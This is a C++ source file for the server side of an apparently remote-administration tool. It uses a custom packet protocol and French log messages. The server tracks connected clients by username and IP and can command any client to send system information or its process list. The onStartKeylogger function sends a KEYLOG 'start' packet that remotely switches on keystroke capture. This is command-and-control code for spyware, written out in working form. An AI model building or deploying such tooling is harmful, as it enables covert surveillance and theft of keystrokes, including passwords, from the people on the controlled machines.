#include "ServerApp.hpp"
#include <QDebug> 

ServerApp::ServerApp(const std::string &envFilePath)
    : m_envFilePath(envFilePath)
{
#ifdef _WIN32
    SetConsoleOutputCP(CP_UTF8);
    SetConsoleCP(CP_UTF8);
#endif

    EnvLoader::loadEnv(m_envFilePath);
    int port = EnvLoader::loadPort(m_envFilePath);
    std::cout << "ServerApp: écoute sur le port " << port << "...\n";

    m_serverSocket.bindSocket(port);
    m_serverSocket.listenSocket();
}

ServerApp::~ServerApp()
{
    m_serverSocket.closeSocket();
}

void ServerApp::run()
{
    std::cout << "Serveur prêt. En attente de connexions...\n";

    while (true)
    {
        fd_set readfds;
        FD_ZERO(&readfds);

        int listenFd = m_serverSocket.getSocketFd();
        FD_SET(listenFd, &readfds);
        int maxFd = listenFd;

        for (const auto &c : m_clients) {
            int fd = c->getSocketFd();
            FD_SET(fd, &readfds);
            if (fd > maxFd) maxFd = fd;
        }

        int activity = select(maxFd + 1, &readfds, nullptr, nullptr, nullptr);
        if (activity < 0) {
            std::cerr << "select() error: " << std::strerror(errno) << "\n";
            break;
        }

        if (FD_ISSET(listenFd, &readfds)) {
            auto newCl = m_serverSocket.acceptSocket();
            std::cout << "Client connecté: " << newCl->getClientIP() << " (awaiting user info)\n";
            m_clients.push_back(std::move(newCl));
            m_clientUsers.emplace_back();
        }

        for (size_t idx = 0; idx < m_clients.size(); )
        {
            auto &client = m_clients[idx];
            int fd = client->getSocketFd();
            if (!FD_ISSET(fd, &readfds)) {
                ++idx;
                continue;
            }

            try
            {
                auto data = client->recvBinary();
                auto pkt = LPTF_Packet::deserialize(data);

                if (pkt.getType() == PacketType::GET_INFO)
                {
                    std::string payload(pkt.getPayload().begin(), pkt.getPayload().end());
                    const std::string key = "\"username\":\"";
                    std::string username;
                    auto pos = payload.find(key);
                    if (pos != std::string::npos) {
                        pos += key.size();
                        auto end = payload.find('"', pos);
                        if (end != std::string::npos) {
                            username = payload.substr(pos, end - pos);
                        }
                    }
                    m_clientUsers[idx] = username;
                    std::string clientInfo = username + " " + client->getClientIP();

                    static uint32_t nextSessionId = 1;
                    uint32_t sessionId = nextSessionId++;
                    emit clientConnected(QString::fromStdString(clientInfo), sessionId);
                }
                else
                {
                    std::string msg(pkt.getPayload().begin(), pkt.getPayload().end());
                    std::string clientInfo = m_clientUsers[idx] + " " + client->getClientIP();

                    qDebug() << "[ServerApp] Received packet type=" << static_cast<int>(pkt.getType())
                             << " from" << QString::fromStdString(clientInfo)
                             << "payload size=" << msg.size();

                    emit clientResponse(
                        QString::fromStdString(clientInfo),
                        QString::fromStdString(msg)
                    );

                    // optionnel ack
                    std::string resp = "ACK: " + msg;
                    std::vector<uint8_t> pay(resp.begin(), resp.end());
                    LPTF_Packet ack(
                        1,
                        PacketType::RESPONSE,
                        0, 0, 0,
                        pay
                    );
                    client->sendBinary(ack.serialize());
                }

                ++idx;
            }
            catch (const std::exception &e)
            {
                std::cout << "Déconnexion de " << client->getClientIP()
                          << " (" << e.what() << ")\n";
                m_clients.erase(m_clients.begin() + idx);
                m_clientUsers.erase(m_clientUsers.begin() + idx);
            }
        }
    }
}

void ServerApp::onGetInfoSys(const QString& clientId)
{
    uint32_t sessionId = 0;
    LPTF_Packet packet(1, PacketType::GET_INFO, 0, 0, sessionId, {});
    auto raw = packet.serialize();
    QByteArray qraw(reinterpret_cast<const char*>(raw.data()), int(raw.size()));
    sendToClientInternal(clientId, qraw);
}

void ServerApp::onStartKeylogger(const QString& clientId)
{
    qDebug() << "[ServerApp] onStartKeylogger for" << clientId;

 // Prepare the "start" command as payload
const std::string cmdStart = "start";
const std::vector<uint8_t> startPayload(cmdStart.begin(), cmdStart.end());

// Use appropriate packetId and sessionId if you track them per client/session we match what was sent in menu.cpp
const uint32_t packetId = 1;    // or increment if needed
const uint32_t sessionId = 0;   // or your actual sessionId

LPTF_Packet packet(
    1,                         // version
    PacketType::KEYLOG,        // type
    0,                         // flags
    packetId,                  // packetId (match terminal or logic)
    sessionId,                 // sessionId (match terminal or logic)
    startPayload               // payload: "start"
);

const auto raw = packet.serialize();
const QByteArray qraw(reinterpret_cast<const char*>(raw.data()), int(raw.size()));

sendToClientInternal(clientId, qraw);

qDebug() << "[ServerApp] Keylogger started for" << clientId;
}

void ServerApp::onRequestProcessList(const QString& clientId, bool namesOnly)
{
    qDebug() << "[ServerApp] onRequestProcessList for" << clientId << "namesOnly=" << namesOnly;

    uint32_t sessionId = 0;
    uint8_t flags = namesOnly ? 1 : 0;

    LPTF_Packet packet(
        1,                         // version
        PacketType::PROCESS_LIST,  // type
        flags,                     // flags
        0,                         // packetId
        sessionId,                 // sessionId
        {}                         // payload vide
    );

    auto raw = packet.serialize();
    QByteArray qraw(reinterpret_cast<const char*>(raw.data()), int(raw.size()));

    sendToClientInternal(clientId, qraw);
}

void ServerApp::sendToClient(const QString& clientInfo, const QByteArray& data)
{
    sendToClientInternal(clientInfo, data);
}

void ServerApp::sendToClientInternal(const QString& clientId, const QByteArray& data)
{
    auto parts = clientId.split(' ');
    const QString ip = (parts.size() >= 2 ? parts.last() : QString());

    for (const auto& sockPtr : m_clients) {
        if (QString::fromStdString(sockPtr->getClientIP()) == ip) {
            std::vector<uint8_t> raw(
                reinterpret_cast<const uint8_t*>(data.constData()),
                reinterpret_cast<const uint8_t*>(data.constData()) + data.size()
            );
            sockPtr->sendBinary(raw);
            return;
        }
    }
    qWarning() << "sendToClientInternal: client non trouvé:" << clientId;
}
